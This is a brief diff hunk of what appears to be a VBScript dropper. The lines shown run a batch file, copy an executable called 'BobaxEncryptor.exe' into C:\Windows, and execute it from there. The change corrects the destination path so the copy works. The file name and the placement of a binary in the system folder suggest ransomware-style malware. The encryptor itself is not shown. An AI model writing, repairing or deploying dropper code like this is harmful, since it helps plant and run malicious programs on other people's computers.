@@ -13,7 +13,7 @@ CreateObject("Wscript.Shell").Run """file.bat""", 1, True
 
 
 
-fso.CopyFile "BobaxEncryptor.exe", "C:\Windows"
+fso.CopyFile "BobaxEncryptor.exe", "C:\Windows\"
 CreateObject("Wscript.Shell").Run """C:\Windows\BobaxEncryptor.exe""", 1, True
 
 
